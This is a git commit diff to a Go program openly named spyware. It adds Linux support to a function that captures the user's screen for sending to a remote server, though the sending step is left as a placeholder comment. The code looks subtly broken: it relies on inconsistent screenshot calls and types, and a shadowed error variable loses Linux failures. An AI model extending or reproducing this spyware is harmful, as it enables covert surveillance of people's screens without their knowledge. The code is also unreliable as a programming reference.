73bf3694a59a783c8761d3762385f0a130fe1d0b
ethanlacerenza <71321892+ethanlacerenza@users.noreply.github.com>
2023-10-31 11:23:03 +0100

    adding linux library

--- cmd/spyware/main.go
+++ cmd/spyware/main.go
@@ -2,9 +2,11 @@ package main
 
 import (
 	"os"
+	"runtime"
 	"time"
 
 	"github.com/kbinani/screenshot"
+	"github.com/kbinani/xrandr"
 )
 
 func main() {
@@ -22,7 +24,22 @@ func main() {
 }
 
 func captureAndSendScreenshot(serverURL string) {
-	img, err := screenshot.CaptureScreen()
+	var img *screenshot.Image
+	var err error
+
+	// Check the runtime OS
+	switch runtime.GOOS {
+	case "windows":
+		img, err = screenshot.CaptureScreen()
+	case "linux":
+		outputs, err := xrandr.GetActiveOutputs()
+		if err == nil && len(outputs) > 0 {
+			img, err = screenshot.CaptureScreen(xrandrScreen(outputs[0]))
+		}
+	default:
+		panic("Unsupported operating system")
+	}
+
 	if err != nil {
 		panic(err)
 	}
@@ -30,4 +47,14 @@ func captureAndSendScreenshot(serverURL string) {
 	// Now, you can send the image to the server URL.
 	// Use `serverURL` to send the image to the remote server.
 	// Implement the logic to send to the server as per your preference.
+}
+
+// Convert xrandr output to screenshot screen
+func xrandrScreen(output xrandr.Output) screenshot.Screen {
+	return screenshot.Screen{
+		X:      output.Crtc.X,
+		Y:      output.Crtc.Y,
+		Width:  output.Crtc.Width,
+		Height: output.Crtc.Height,
+	}
 }
